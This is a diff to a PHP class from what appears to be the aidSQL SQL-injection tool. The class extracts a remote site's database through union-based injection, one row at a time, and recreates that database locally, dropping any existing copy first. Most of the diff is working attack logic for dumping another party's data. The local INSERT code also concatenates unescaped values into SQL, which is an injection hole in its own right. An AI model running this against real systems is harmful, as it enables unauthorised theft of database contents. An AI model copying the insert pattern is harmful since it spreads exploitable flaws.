@@ -11,15 +11,41 @@
 			private	$_pLoader		=	NULL;
 
 			public function __construct(Array $config,\aidSQL\http\adapter &$httpAdapter,\aidSQL\core\PluginLoader &$pLoader,\aidSQL\core\Logger &$log){
-	
+
+				$this->_config			=	$config;
 				$this->_xmlFile		=	new \aidSQL\core\File($config["makedb"]);
-				$this->_logger			=	$log;	
+				$this->setLog($log);
 				$this->_httpAdapter	=	$httpAdapter;
 				$pLoader->setConfig($config);
 				$this->_pLoader		=	$pLoader;
 				
 				$this->makeDB();
 	
+			}
+
+			public function setLog(\aidSQL\core\Logger &$logger){
+
+				$this->_logger	=	$logger;
+				$this->_logger->setPrepend('[' . __CLASS__ . ']');
+
+			}
+
+
+			private function log($msg=NULL, $color="white", $level=0, $toFile=FALSE) {
+
+				if (isset($this->_options["log-all"])) {
+					$toFile = TRUE;
+				}
+
+				if (!is_null($this->_logger)) {
+
+					$this->_logger->setPrepend('[' . __CLASS__ . ']');
+					$this->_logger->log($msg, $color, $level, $toFile);
+					return TRUE;
+				}
+
+				return FALSE;
+
 			}
 
 			public function setConfig(Array $config){
@@ -123,25 +149,98 @@
 
 			public function makeDb(){
 
+				$mysqli	=	@new \MySQLi($this->_config["dbhost"],"root",$this->_config["dbpass"]);
+
+				if ($mysqli->connect_error) {
+					throw(new \Exception('MySQLi Connect Error (' . $mysqli->connect_errno . '), check the host and password!'));
+				}
+
 				$schemas	=	$this->parseXml();
 				$plugin	=	$this->_pLoader->getPluginInstance("sqli","mysql5",$this->_httpAdapter,$this->_logger);
+
 				$plugin->injectionUnionWithConcat();
 
 				foreach($schemas as $schemaName=>$schemaTables){
 					
-						foreach($schemaTables as $schemaTableName=>$schemaTableValues){
+					$this->createDatabase($mysqli,"aidSQL_".$schemaName);
+					$mysqli->select_db("aidSQL_".$schemaName);
 
-							$attributes			=	$schemaTableValues["attributes"];
-							$columns				=	array_keys($schemaTableValues["columns"]);
-							$select				=	implode(',0x7c,',$columns);
-							$from					=	$schemaName.'.'.$schemaTableName;
-							$count				=	$plugin->count($columns[0],$from);
-							var_dump($plugin->unionQueryIterateLimit($select,$from,array(),array(),$count[0]-1));
-							die();
+					foreach($schemaTables as $schemaTableName=>$schemaTableValues){
+
+						if($this->createTable($mysqli,$schemaTableName,$schemaTableValues)!==TRUE){
+							die("NO");
+						}
+
+						$attributes			=	$schemaTableValues["attributes"];
+						$columns				=	array_keys($schemaTableValues["columns"]);
+						$select				=	implode(',0x7c,',$columns);
+						$from					=	$schemaName.'.'.$schemaTableName;
+
+						$count				=	$plugin->count($columns[0],$from);
+						$count				=	$count[0] - 1;
+
+						if($count==-1){
+
+							$this->log("No registers found on this table",0,"yellow");
+							continue;
 
 						}
 
+						for($i=0;$i<$count;$i++){
+
+							$parameters	=	$plugin->getInjectionParameters();
+							$parameters["limit"]	=	array($i,1);
+							$plugin->setInjectionParameters($parameters);
+							$values	=	$plugin->unionQuery($select,$from,array(),array());
+							$values	=	$values[0];
+							
+							$values	=	explode('|',$values);
+							$this->insertRegisters($mysqli,$schemaTableName,$columns,$values);
+
+						}
+
+					}
+
 				}
+
+			}
+
+			public function createDatabase(\MySQLi &$sqli,$schemaName){
+
+				$sql	=	"DROP DATABASE IF EXISTS $schemaName";
+				$sqli->query($sql);
+				$sql	=	"CREATE DATABASE $schemaName";
+				$sqli->query($sql);
+
+			}
+
+			public function createTable(\MySQLi &$sqli,$tableName,Array $tableColumns){
+
+				$sql	=	"CREATE TABLE $tableName(";
+
+				$columns	=	array();
+				foreach($tableColumns["columns"] as $columnName=>$columnSpecs){
+
+					$columns[]="$columnName ".$columnSpecs["type"];
+
+				}
+				$sql.=implode(',',$columns).')';
+				echo $sql."\n";
+				return $sqli->query($sql);
+
+			}
+
+			public function insertRegisters(\MySQLi &$sqli,$tableName,Array $columns,Array $registers){
+			
+				$sql		=	"INSERT INTO $tableName SET ";
+				$columns	=	array_combine($columns,$registers);
+
+				foreach($columns as $colName=>$colVal){
+					$sql.="$colName='$colVal',";
+				}
+
+				$sql=substr($sql,0,-1);
+				return $sqli->query($sql);
 
 			}
 
